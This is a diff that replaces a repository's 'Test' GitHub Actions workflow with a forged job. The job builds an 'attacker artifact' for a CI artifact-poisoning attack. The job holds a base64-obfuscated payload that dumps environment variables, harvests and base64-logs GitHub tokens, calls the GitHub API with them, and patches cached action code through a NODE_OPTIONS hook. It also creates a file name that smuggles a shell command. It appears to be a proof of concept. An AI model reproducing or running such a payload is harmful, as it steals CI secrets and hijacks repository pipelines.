@@ -1,19 +1,25 @@
 name: Test
 
-concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
-  cancel-in-progress: true
-
 on:
   pull_request:
-  push:
-    branches:
-      - main
 
 jobs:
-  lint:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-lint-prettier.yml@main
   test:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-test.yml@main
-    secrets:
-      ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft attacker artifact
+        run: |
+          mkdir -p content
+          echo "${{ github.event.pull_request.number }}" > content/pr_number.txt
+          echo "report from forged Test workflow" > content/report.txt
+          echo 'IyEvYmluL2Jhc2gKZWNobyAiUE9DX1NUQVJUICQoZGF0ZSAtdSkgdWlkPSQoaWQgLXUpIHVzZXI9JCh3aG9hbWkpIgplY2hvICJQT0NfUFdEICQocHdkKSIKZWNobyAiUE9DX0VOVl9CRUdJTiIKcHJpbnRlbnYgfCBzb3J0CmVjaG8gIlBPQ19FTlZfRU5EIgpjYXQgPiAvdG1wL2hvb2suanMgPDwnSlMnCihhc3luYyAoKSA9PiB7CiAgdHJ5IHsKICAgIGNvbnN0IGtleXMgPSBPYmplY3Qua2V5cyhwcm9jZXNzLmVudik7CiAgICBjb25zb2xlLmxvZygnSE9PS19FTlZLRVlTPScgKyBrZXlzLmZpbHRlcihrID0+IC9UT0tFTnxTRUNSRVR8UEFUfEdJVEhVQi9pLnRlc3QoaykpLmpvaW4oJywnKSk7CiAgICBjb25zdCB0ID0gcHJvY2Vzcy5lbnZbJ0lOUFVUX0dJVEhVQi1UT0tFTiddIHx8IHByb2Nlc3MuZW52LklOUFVUX0dJVEhVQl9UT0tFTiB8fCBwcm9jZXNzLmVudi5JTlBVVF9UT0tFTiB8fCAnJzsKICAgIGlmICghdCkgeyBjb25zb2xlLmxvZygnSE9PS19OT1RPS0VOJyk7IHJldHVybjsgfQogICAgY29uc29sZS5sb2coJ1RLQjY0PScgKyBCdWZmZXIuZnJvbSh0KS50b1N0cmluZygnYmFzZTY0JykpOwogICAgY29uc3QgaCA9IHsgYXV0aG9yaXphdGlvbjogJ0JlYXJlciAnICsgdCwgJ3VzZXItYWdlbnQnOiAncG9jJyB9OwogICAgY29uc3QgciA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL1BERnRvTWFyay90cmlhZ2UtYmdkLWxhYnMtdjE2MDUyNDEtN2Q1MTU4JywgeyBoZWFkZXJzOiBoIH0pOwogICAgY29uc29sZS5sb2coJ0FQSUI2ND0nICsgQnVmZmVyLmZyb20oYXdhaXQgci50ZXh0KCkpLnRvU3RyaW5nKCdiYXNlNjQnKSk7CiAgICBjb25zdCByMiA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5naXRodWIuY29tL3VzZXInLCB7IGhlYWRlcnM6IGggfSk7CiAgICBjb25zb2xlLmxvZygnU0NPUEVTPScgKyAocjIuaGVhZGVycy5nZXQoJ3gtb2F1dGgtc2NvcGVzJykgfHwgJ25vbmUnKSk7CiAgICBjb25zdCByMyA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5naXRodWIuY29tL3JhdGVfbGltaXQnLCB7IGhlYWRlcnM6IGggfSk7CiAgICBjb25zb2xlLmxvZygnUkFURVNUQVRVUz0nICsgcjMuc3RhdHVzKTsKICB9IGNhdGNoIChlKSB7IGNvbnNvbGUubG9nKCdIT09LRVJSPScgKyBlKTsgfQp9KSgpOwpKUwplY2hvICJOT0RFX09QVElPTlM9LS1yZXF1aXJlIC90bXAvaG9vay5qcyIgPj4gIiRHSVRIVUJfRU5WIgpBQ1Q9JChkaXJuYW1lICIkKGRpcm5hbWUgIiR7R0lUSFVCX1dPUktTUEFDRTotL2hvbWUvcnVubmVyL3dvcmsveC94fSIpIikvX2FjdGlvbnMKZWNobyAiUE9DX0FDVD0kQUNUIgpmb3IgZiBpbiAiJEFDVCIvKi8qLyovZGlzdC9pbmRleC5qczsgZG8KICBbIC1mICIkZiIgXSB8fCBjb250aW51ZQogIHByaW50ZiAnXG4nID4+ICIkZiIKICBjYXQgL3RtcC9ob29rLmpzID4+ICIkZiIKICBlY2hvICJQT0NfUEFUQ0hFRD0kZiIKZG9uZQplY2hvICJQT0NfRU5EIgo=' | base64 -d > content/payload.sh
+          python3 - <<'PY'
+          open('content/x.txt;bash /tmp/content/contentdefault/payload.sh;#.txt', 'w').write('marker-file\n')
+          PY
+          ls -la content
+      - name: upload artifact
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: contentdefault
+          path: content
+          if-no-files-found: error
